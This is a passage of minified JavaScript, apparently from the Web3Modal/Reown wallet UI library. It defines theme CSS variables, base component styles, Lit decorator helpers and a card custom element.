        --w3m-color-mix-strength: ${Tn(r?.["--w3m-color-mix-strength"]?`${r["--w3m-color-mix-strength"]}%`:"0%")};
        --w3m-font-family: ${Tn(r?.["--w3m-font-family"]||"Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;")};
        --w3m-font-size-master: ${Tn(r?.["--w3m-font-size-master"]||"10px")};
        --w3m-border-radius-master: ${Tn(r?.["--w3m-border-radius-master"]||"4px")};
        --w3m-z-index: ${Tn(r?.["--w3m-z-index"]||999)};

        --wui-font-family: var(--w3m-font-family);

        --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
        --wui-font-size-micro: var(--w3m-font-size-master);
        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
        --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
        --wui-font-size-title-6: calc(var(--w3m-font-size-master) * 2.2);
        --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
        --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);

        --wui-border-radius-5xs: var(--w3m-border-radius-master);
        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);

        --wui-font-weight-light: 400;
        --wui-font-weight-regular: 500;
        --wui-font-weight-medium: 600;
        --wui-font-weight-bold: 700;

        --wui-letter-spacing-2xl: -1.6px;
        --wui-letter-spacing-medium-title: -0.96px;
        --wui-letter-spacing-title-6: -0.88px;
        --wui-letter-spacing-large: -0.8px;
        --wui-letter-spacing-medium: -0.72px;
        --wui-letter-spacing-paragraph: -0.64px;
        --wui-letter-spacing-small: -0.56px;
        --wui-letter-spacing-tiny: -0.48px;
        --wui-letter-spacing-micro: -0.2px;
        --wui-letter-spacing-mini: -0.16px;

        --wui-spacing-0: 0px;
        --wui-spacing-4xs: 2px;
        --wui-spacing-3xs: 4px;
        --wui-spacing-xxs: 6px;
        --wui-spacing-2xs: 7px;
        --wui-spacing-xs: 8px;
        --wui-spacing-1xs: 10px;
        --wui-spacing-s: 12px;
        --wui-spacing-m: 14px;
        --wui-spacing-l: 16px;
        --wui-spacing-2l: 18px;
        --wui-spacing-xl: 20px;
        --wui-spacing-xxl: 24px;
        --wui-spacing-2xl: 32px;
        --wui-spacing-3xl: 40px;
        --wui-spacing-4xl: 90px;
        --wui-spacing-5xl: 95px;

        --wui-icon-box-size-xxs: 14px;
        --wui-icon-box-size-xs: 20px;
        --wui-icon-box-size-sm: 24px;
        --wui-icon-box-size-md: 32px;
        --wui-icon-box-size-mdl: 36px;
        --wui-icon-box-size-lg: 40px;
        --wui-icon-box-size-2lg: 48px;
        --wui-icon-box-size-xl: 64px;

        --wui-icon-size-inherit: inherit;
        --wui-icon-size-xxs: 10px;
        --wui-icon-size-xs: 12px;
        --wui-icon-size-sm: 14px;
        --wui-icon-size-md: 16px;
        --wui-icon-size-mdl: 18px;
        --wui-icon-size-lg: 20px;
        --wui-icon-size-xl: 24px;
        --wui-icon-size-xxl: 28px;

        --wui-wallet-image-size-inherit: inherit;
        --wui-wallet-image-size-sm: 40px;
        --wui-wallet-image-size-md: 56px;
        --wui-wallet-image-size-lg: 80px;

        --wui-visual-size-size-inherit: inherit;
        --wui-visual-size-sm: 40px;
        --wui-visual-size-md: 55px;
        --wui-visual-size-lg: 80px;

        --wui-box-size-md: 100px;
        --wui-box-size-lg: 120px;

        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);

        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);

        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);

        --wui-duration-lg: 200ms;
        --wui-duration-md: 125ms;
        --wui-duration-sm: 75ms;

        --wui-path-network-sm: path(
          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
        );

        --wui-path-network-md: path(
          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
        );

        --wui-path-network-lg: path(
          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
        );

        --wui-width-network-sm: 36px;
        --wui-width-network-md: 48px;
        --wui-width-network-lg: 86px;

        --wui-height-network-sm: 40px;
        --wui-height-network-md: 54px;
        --wui-height-network-lg: 96px;

        --wui-icon-size-network-xs: 12px;
        --wui-icon-size-network-sm: 16px;
        --wui-icon-size-network-md: 24px;
        --wui-icon-size-network-lg: 42px;

        --wui-color-inherit: inherit;

        --wui-color-inverse-100: #fff;
        --wui-color-inverse-000: #000;

        --wui-cover: rgba(20, 20, 20, 0.8);

        --wui-color-modal-bg: var(--wui-color-modal-bg-base);

        --wui-color-accent-100: var(--wui-color-accent-base-100);
        --wui-color-accent-090: var(--wui-color-accent-base-090);
        --wui-color-accent-080: var(--wui-color-accent-base-080);

        --wui-color-success-100: var(--wui-color-success-base-100);
        --wui-color-success-125: var(--wui-color-success-base-125);

        --wui-color-warning-100: var(--wui-color-warning-base-100);

        --wui-color-error-100: var(--wui-color-error-base-100);
        --wui-color-error-125: var(--wui-color-error-base-125);

        --wui-color-blue-100: var(--wui-color-blue-base-100);
        --wui-color-blue-90: var(--wui-color-blue-base-90);

        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);

        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-100);

        --wui-avatar-border: var(--wui-avatar-border-base);

        --wui-thumbnail-border: var(--wui-thumbnail-border-base);

        --wui-wallet-button-bg: var(--wui-wallet-button-bg-base);

        --wui-box-shadow-blue: var(--wui-color-accent-glass-020);
      }

      @supports (background: color-mix(in srgb, white 50%, black)) {
        :root {
          --wui-color-modal-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-modal-bg-base)
          );

          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 20%, transparent);

          --wui-color-accent-100: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 100%,
            transparent
          );
          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-glass-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-020: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 20%,
            transparent
          );
          --wui-color-accent-glass-015: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 15%,
            transparent
          );
          --wui-color-accent-glass-010: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 10%,
            transparent
          );
          --wui-color-accent-glass-005: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 5%,
            transparent
          );
          --wui-color-accent-002: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 2%,
            transparent
          );

          --wui-color-fg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-100)
          );
          --wui-color-fg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-125)
          );
          --wui-color-fg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-150)
          );
          --wui-color-fg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-175)
          );
          --wui-color-fg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-200)
          );
          --wui-color-fg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-225)
          );
          --wui-color-fg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-250)
          );
          --wui-color-fg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-275)
          );
          --wui-color-fg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-300)
          );
          --wui-color-fg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-325)
          );
          --wui-color-fg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-350)
          );

          --wui-color-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-100)
          );
          --wui-color-bg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-125)
          );
          --wui-color-bg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-150)
          );
          --wui-color-bg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-175)
          );
          --wui-color-bg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-200)
          );
          --wui-color-bg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-225)
          );
          --wui-color-bg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-250)
          );
          --wui-color-bg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-275)
          );
          --wui-color-bg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-300)
          );
          --wui-color-bg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-325)
          );
          --wui-color-bg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-350)
          );

          --wui-color-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-100)
          );
          --wui-color-success-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-125)
          );

          --wui-color-warning-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-warning-base-100)
          );

          --wui-color-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-100)
          );
          --wui-color-blue-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-100)
          );
          --wui-color-blue-90: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-90)
          );
          --wui-color-error-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-125)
          );

          --wui-icon-box-bg-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-error-base-100)
          );
          --wui-icon-box-bg-accent-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-blue-base-100)
          );
          --wui-icon-box-bg-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-success-base-100)
          );
          --wui-icon-box-bg-inverse-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-inverse-base-100)
          );

          --wui-all-wallets-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-all-wallets-bg-100)
          );

          --wui-avatar-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-avatar-border-base)
          );

          --wui-thumbnail-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-thumbnail-border-base)
          );

          --wui-wallet-button-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-wallet-button-bg-base)
          );
        }
      }
    `,light:ge`
      :root {
        --w3m-color-mix: ${Tn(r?.["--w3m-color-mix"]||"#fff")};
        --w3m-accent: ${Tn(gd(r,"dark")["--w3m-accent"])};
        --w3m-default: #fff;

        --wui-color-modal-bg-base: ${Tn(gd(r,"dark")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(230, 100%, 67%, 1);
        --wui-color-blueberry-090: hsla(231, 76%, 61%, 1);
        --wui-color-blueberry-080: hsla(230, 59%, 55%, 1);
        --wui-color-blueberry-050: hsla(231, 100%, 70%, 0.1);

        --wui-color-fg-100: #e4e7e7;
        --wui-color-fg-125: #d0d5d5;
        --wui-color-fg-150: #a8b1b1;
        --wui-color-fg-175: #a8b0b0;
        --wui-color-fg-200: #949e9e;
        --wui-color-fg-225: #868f8f;
        --wui-color-fg-250: #788080;
        --wui-color-fg-275: #788181;
        --wui-color-fg-300: #6e7777;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #363636;

        --wui-color-bg-100: #141414;
        --wui-color-bg-125: #191a1a;
        --wui-color-bg-150: #1e1f1f;
        --wui-color-bg-175: #222525;
        --wui-color-bg-200: #272a2a;
        --wui-color-bg-225: #2c3030;
        --wui-color-bg-250: #313535;
        --wui-color-bg-275: #363b3b;
        --wui-color-bg-300: #3b4040;
        --wui-color-bg-325: #252525;
        --wui-color-bg-350: #ffffff;

        --wui-color-success-base-100: #26d962;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f25a67;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 217, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 217, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 217, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 217, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 217, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 217, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 217, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 217, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 217, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 217, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(242, 90, 103, 0.01);
        --wui-color-error-glass-002: rgba(242, 90, 103, 0.02);
        --wui-color-error-glass-005: rgba(242, 90, 103, 0.05);
        --wui-color-error-glass-010: rgba(242, 90, 103, 0.1);
        --wui-color-error-glass-015: rgba(242, 90, 103, 0.15);
        --wui-color-error-glass-020: rgba(242, 90, 103, 0.2);
        --wui-color-error-glass-025: rgba(242, 90, 103, 0.25);
        --wui-color-error-glass-030: rgba(242, 90, 103, 0.3);
        --wui-color-error-glass-060: rgba(242, 90, 103, 0.6);
        --wui-color-error-glass-080: rgba(242, 90, 103, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-color-gray-glass-001: rgba(255, 255, 255, 0.01);
        --wui-color-gray-glass-002: rgba(255, 255, 255, 0.02);
        --wui-color-gray-glass-005: rgba(255, 255, 255, 0.05);
        --wui-color-gray-glass-010: rgba(255, 255, 255, 0.1);
        --wui-color-gray-glass-015: rgba(255, 255, 255, 0.15);
        --wui-color-gray-glass-020: rgba(255, 255, 255, 0.2);
        --wui-color-gray-glass-025: rgba(255, 255, 255, 0.25);
        --wui-color-gray-glass-030: rgba(255, 255, 255, 0.3);
        --wui-color-gray-glass-060: rgba(255, 255, 255, 0.6);
        --wui-color-gray-glass-080: rgba(255, 255, 255, 0.8);
        --wui-color-gray-glass-090: rgba(255, 255, 255, 0.9);

        --wui-color-dark-glass-100: rgba(42, 42, 42, 1);

        --wui-icon-box-bg-error-base-100: #3c2426;
        --wui-icon-box-bg-blue-base-100: #20303f;
        --wui-icon-box-bg-success-base-100: #1f3a28;
        --wui-icon-box-bg-inverse-base-100: #243240;

        --wui-all-wallets-bg-100: #222b35;

        --wui-avatar-border-base: #252525;

        --wui-thumbnail-border-base: #252525;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --w3m-card-embedded-shadow-color: rgb(17 17 18 / 25%);
      }
    `,dark:ge`
      :root {
        --w3m-color-mix: ${Tn(r?.["--w3m-color-mix"]||"#000")};
        --w3m-accent: ${Tn(gd(r,"light")["--w3m-accent"])};
        --w3m-default: #000;

        --wui-color-modal-bg-base: ${Tn(gd(r,"light")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(231, 100%, 70%, 1);
        --wui-color-blueberry-090: hsla(231, 97%, 72%, 1);
        --wui-color-blueberry-080: hsla(231, 92%, 74%, 1);

        --wui-color-fg-100: #141414;
        --wui-color-fg-125: #2d3131;
        --wui-color-fg-150: #474d4d;
        --wui-color-fg-175: #636d6d;
        --wui-color-fg-200: #798686;
        --wui-color-fg-225: #828f8f;
        --wui-color-fg-250: #8b9797;
        --wui-color-fg-275: #95a0a0;
        --wui-color-fg-300: #9ea9a9;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #d0d0d0;

        --wui-color-bg-100: #ffffff;
        --wui-color-bg-125: #f5fafa;
        --wui-color-bg-150: #f3f8f8;
        --wui-color-bg-175: #eef4f4;
        --wui-color-bg-200: #eaf1f1;
        --wui-color-bg-225: #e5eded;
        --wui-color-bg-250: #e1e9e9;
        --wui-color-bg-275: #dce7e7;
        --wui-color-bg-300: #d8e3e3;
        --wui-color-bg-325: #f3f3f3;
        --wui-color-bg-350: #202020;

        --wui-color-success-base-100: #26b562;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f05142;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 181, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 181, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 181, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 181, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 181, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 181, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 181, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 181, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 181, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 181, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(240, 81, 66, 0.01);
        --wui-color-error-glass-002: rgba(240, 81, 66, 0.02);
        --wui-color-error-glass-005: rgba(240, 81, 66, 0.05);
        --wui-color-error-glass-010: rgba(240, 81, 66, 0.1);
        --wui-color-error-glass-015: rgba(240, 81, 66, 0.15);
        --wui-color-error-glass-020: rgba(240, 81, 66, 0.2);
        --wui-color-error-glass-025: rgba(240, 81, 66, 0.25);
        --wui-color-error-glass-030: rgba(240, 81, 66, 0.3);
        --wui-color-error-glass-060: rgba(240, 81, 66, 0.6);
        --wui-color-error-glass-080: rgba(240, 81, 66, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-icon-box-bg-error-base-100: #f4dfdd;
        --wui-icon-box-bg-blue-base-100: #d9ecfb;
        --wui-icon-box-bg-success-base-100: #daf0e4;
        --wui-icon-box-bg-inverse-base-100: #dcecfc;

        --wui-all-wallets-bg-100: #e8f1fa;

        --wui-avatar-border-base: #f3f4f4;

        --wui-thumbnail-border-base: #eaefef;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --wui-color-gray-glass-001: rgba(0, 0, 0, 0.01);
        --wui-color-gray-glass-002: rgba(0, 0, 0, 0.02);
        --wui-color-gray-glass-005: rgba(0, 0, 0, 0.05);
        --wui-color-gray-glass-010: rgba(0, 0, 0, 0.1);
        --wui-color-gray-glass-015: rgba(0, 0, 0, 0.15);
        --wui-color-gray-glass-020: rgba(0, 0, 0, 0.2);
        --wui-color-gray-glass-025: rgba(0, 0, 0, 0.25);
        --wui-color-gray-glass-030: rgba(0, 0, 0, 0.3);
        --wui-color-gray-glass-060: rgba(0, 0, 0, 0.6);
        --wui-color-gray-glass-080: rgba(0, 0, 0, 0.8);
        --wui-color-gray-glass-090: rgba(0, 0, 0, 0.9);

        --wui-color-dark-glass-100: rgba(233, 233, 233, 1);

        --w3m-card-embedded-shadow-color: rgb(224 225 233 / 25%);
      }
    `}}const ht=ge`
  *,
  *::after,
  *::before,
  :host {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-style: normal;
    text-rendering: optimizeSpeed;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    -webkit-tap-highlight-color: transparent;
    font-family: var(--wui-font-family);
    backface-visibility: hidden;
  }
`,fr=ge`
  button,
  a {
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    transition:
      color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      box-shadow var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color, color, border, box-shadow, border-radius;
    outline: none;
    border: none;
    column-gap: var(--wui-spacing-3xs);
    background-color: transparent;
    text-decoration: none;
  }

  wui-flex {
    transition: border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius;
  }

  button:disabled > wui-wallet-image,
  button:disabled > wui-all-wallets-image,
  button:disabled > wui-network-image,
  button:disabled > wui-image,
  button:disabled > wui-transaction-visual,
  button:disabled > wui-logo {
    filter: grayscale(1);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-gray-glass-005);
    }

    button:active:enabled {
      background-color: var(--wui-color-gray-glass-010);
    }
  }

  button:disabled > wui-icon-box {
    opacity: 0.5;
  }

  input {
    border: none;
    outline: none;
    appearance: none;
  }
`,b4=ge`
  .wui-color-inherit {
    color: var(--wui-color-inherit);
  }

  .wui-color-accent-100 {
    color: var(--wui-color-accent-100);
  }

  .wui-color-error-100 {
    color: var(--wui-color-error-100);
  }

  .wui-color-blue-100 {
    color: var(--wui-color-blue-100);
  }

  .wui-color-blue-90 {
    color: var(--wui-color-blue-90);
  }

  .wui-color-error-125 {
    color: var(--wui-color-error-125);
  }

  .wui-color-success-100 {
    color: var(--wui-color-success-100);
  }

  .wui-color-success-125 {
    color: var(--wui-color-success-125);
  }

  .wui-color-inverse-100 {
    color: var(--wui-color-inverse-100);
  }

  .wui-color-inverse-000 {
    color: var(--wui-color-inverse-000);
  }

  .wui-color-fg-100 {
    color: var(--wui-color-fg-100);
  }

  .wui-color-fg-200 {
    color: var(--wui-color-fg-200);
  }

  .wui-color-fg-300 {
    color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    color: var(--wui-color-fg-350);
  }

  .wui-bg-color-inherit {
    background-color: var(--wui-color-inherit);
  }

  .wui-bg-color-blue-100 {
    background-color: var(--wui-color-accent-100);
  }

  .wui-bg-color-error-100 {
    background-color: var(--wui-color-error-100);
  }

  .wui-bg-color-error-125 {
    background-color: var(--wui-color-error-125);
  }

  .wui-bg-color-success-100 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-success-125 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-inverse-100 {
    background-color: var(--wui-color-inverse-100);
  }

  .wui-bg-color-inverse-000 {
    background-color: var(--wui-color-inverse-000);
  }

  .wui-bg-color-fg-100 {
    background-color: var(--wui-color-fg-100);
  }

  .wui-bg-color-fg-200 {
    background-color: var(--wui-color-fg-200);
  }

  .wui-bg-color-fg-300 {
    background-color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    background-color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    background-color: var(--wui-color-fg-350);
  }
`;function aNe(r,e){const{kind:t,elements:i}=e;return{kind:t,elements:i,finisher(n){customElements.get(r)||customElements.define(r,n)}}}function cNe(r,e){return customElements.get(r)||customElements.define(r,e),e}function me(r){return function(t){return typeof t=="function"?cNe(r,t):aNe(r,t)}}const lNe=ge`
  :host {
    display: block;
    border-radius: clamp(0px, var(--wui-border-radius-l), 44px);
    box-shadow: 0 0 0 1px var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-modal-bg);
    overflow: hidden;
  }

  :host([data-embedded='true']) {
    box-shadow:
      0 0 0 1px var(--wui-color-gray-glass-005),
      0px 4px 12px 4px var(--w3m-card-embedded-shadow-color);
  }
`;var uNe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let p7=class extends he{render(){return F`<slot></slot>`}};p7.styles=[ht,lNe];p7=uNe([me("wui-card")],p7);/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const dNe={attribute:!0,type:String,converter:h7,reflect:!1,hasChanged:IR},hNe=(r=dNe,e,t)=>{const{kind:i,metadata:n}=t;let s=globalThis.litPropertyMetadata.get(n);if(s===void 0&&globalThis.litPropertyMetadata.set(n,s=new Map),i==="setter"&&((r=Object.create(r)).wrapped=!0),s.set(t.name,r),i==="accessor"){const{name:o}=t;return{set(a){const c=e.get.call(this);e.set.call(this,a),this.requestUpdate(o,c,r)},init(a){return a!==void 0&&this.C(o,void 0,r,a),a}}}if(i==="setter"){const{name:o}=t;return function(a){const c=this[o];e.call(this,a),this.requestUpdate(o,c,r)}}throw Error("Unsupported decorator location: "+i)};function V(r){return(e,t)=>typeof t=="object"?hNe(r,e,t):((i,n,s)=>{const o=n.hasOwnProperty(s);return n.constructor.createProperty(s,i),o?Object.getOwnPropertyDescriptor(n,s):void 0})(r,e,t)}/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */function te(r){return V({...r,state:!0,attribute:!1})}const fNe=xe`<svg
  width="14"
  height="14"
  viewBox="0 0 14 14"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
